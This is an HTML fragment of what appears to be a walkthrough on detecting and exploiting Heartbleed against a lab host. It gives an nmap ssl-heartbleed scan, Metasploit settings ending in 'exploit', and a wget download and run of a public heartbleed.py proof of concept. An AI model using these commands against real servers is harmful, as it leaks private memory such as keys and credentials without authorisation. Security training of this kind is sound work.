                    ...
                    <div class="row top-buffer">
                        ...
                        <br />
                         <ol>
                            ...
                            <img src="https://vagn.es/img/heartbleedoutput1.png" alt="Heartbleed printable output" width="100%">
                            ...
                            <ol>
                                ...
                                <code>
                                    <p># Syntax</p>
                                    <p>nmap -p [port] --script ssl-heartbleed [target]</p>
                                    <br />
                                    <p># Example</p>
                                    <p>nmap -p 443 --script ssl-heartbleed 10.10.10.79</p>
                                </code>
                                <br />
                                <li>Online</li>
                            ...
                            <code>
                                <p>set RHOSTS 10.10.10.79</p>
                                <p>set THREADS 50</p>
                                <p>set VERBOSE true</p>
                                <p>exploit</p>
                            </code>
                            <br />
                            ...
                            <code>
                                <p>wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</p>
                            </code>
                            <br />
                            <p>To run the script, it could be that you'll have to install a missing module. This can be done with pip:</p>
                             <code>
                                <p># Syntax</p>
                                <p>sudo pip install [module]</p>
                                <br />
                                <p># Example</p>
                                <p>sudo pip install gmpy</p>
                            </code>
                            <br />
                            <p>To run the script, you can specify the following parameters:</p>
                            <code>
                                <p># Syntax</p>
                                <p>python heartbleed.py -p [port] -n [amount of retries] -e [ip]</p>
                                <br />
                                <p># Example</p>
                                <p>python heartbleed.py -p 443 -n 2000 -e 10.10.10.79</p>
                            </code>
                            <br />
